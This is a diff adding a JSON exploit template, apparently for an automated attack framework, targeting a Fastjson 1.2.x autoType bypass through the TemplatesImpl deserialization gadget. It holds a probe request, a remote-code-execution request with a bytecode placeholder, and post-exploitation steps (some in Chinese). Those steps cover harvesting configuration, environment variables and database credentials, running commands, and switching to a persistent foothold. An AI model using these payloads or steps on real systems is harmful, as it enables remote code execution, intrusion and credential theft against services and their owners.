@@ -1,0 +1,117 @@
+{
+  "id": "fastjson-autotype-bypass-templatesimpl-rce",
+  "family": "fastjson",
+  "product": "Fastjson",
+  "cve": "N/A",
+  "aliases": [
+    "Fastjson TemplatesImpl chain",
+    "Fastjson autoType bypass"
+  ],
+  "severity": "high",
+  "tags": [
+    "fastjson",
+    "autotype-bypass",
+    "templatesimpl",
+    "deserialization",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "1.2.48-1.2.68"
+    ],
+    "fingerprints": [
+      "Fastjson remains on an older 1.2.x branch",
+      "Wrapped or obfuscated @type values bypass simple blacklist checks",
+      "Classpath contains Xalan or gadget-relevant classes"
+    ],
+    "signals": [
+      "Simple @type payload is blocked but wrapped/variant @type changes parser behavior",
+      "Application responses leak class resolution or serialization exceptions",
+      "TemplatesImpl-related classes are present in error messages or dependency lists"
+    ]
+  },
+  "preconditions": [
+    "The target must parse attacker-supplied JSON with Fastjson.",
+    "An autoType bypass or alternate gadget path must exist for the specific version.",
+    "The target JVM classpath must contain the gadget classes used by the payload."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/api/json",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[],\"_name\":\"probe\",\"_tfactory\":{}}",
+        "matchers": [
+          "Parser error references TemplatesImpl fields or class loading",
+          "Response differs from baseline autoType rejection"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/api/json",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"{base64_class_bytes}\"],\"_name\":\"poc\",\"_tfactory\":{}}",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认版本和 classpath，避免对不匹配版本反复发送高风险 gadget。",
+      "如果利用成功进入 JVM，优先收集配置、环境变量、数据库和消息队列凭据。",
+      "尽量把后续控制切换到更稳定的 HTTP、文件写入或应用凭据，而不是持续依赖复杂反序列化。"
+    ],
+    "shell_options": [
+      {
+        "type": "bytecode_loader",
+        "template": "Replace {base64_class_bytes} with a minimal command-exec or callback class compiled for the target JDK"
+      },
+      {
+        "type": "environment_probe",
+        "template": "Use bytecode payload to run id; hostname; pwd; env and capture output through application behavior"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先以 TemplatesImpl field parsing probe 判断 classpath 和 bypass 条件。",
+      "再决定是否构造真正的字节码 gadget。",
+      "成功后尽快切换到更可复用的 foothold。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname"
+    ],
+    "shell_prerequisites": [
+      "确认目标 JDK 版本和类加载限制。",
+      "确认响应或 side-channel 足以判断 gadget 是否执行。"
+    ],
+    "fallbacks": [
+      "如果 TemplatesImpl 不可用，退回 JNDI 型链或转向应用层普通 Web 漏洞。",
+      "如果 JSON 接口在消息队列或异步消费中，可结合日志、延迟或业务 side-channel 验证。"
+    ]
+  },
+  "detection_notes": [
+    "TemplatesImpl 链更依赖 classpath 与字节码细节，适合作为二阶段或已知版本后的利用方案。",
+    "没有充分版本和依赖线索时，不建议优先尝试此链。"
+  ],
+  "references": [
+    "Public Fastjson autoType bypass and TemplatesImpl gadget analyses",
+    "Community notes on Fastjson 1.2.x variant bypass behavior"
+  ]
+}
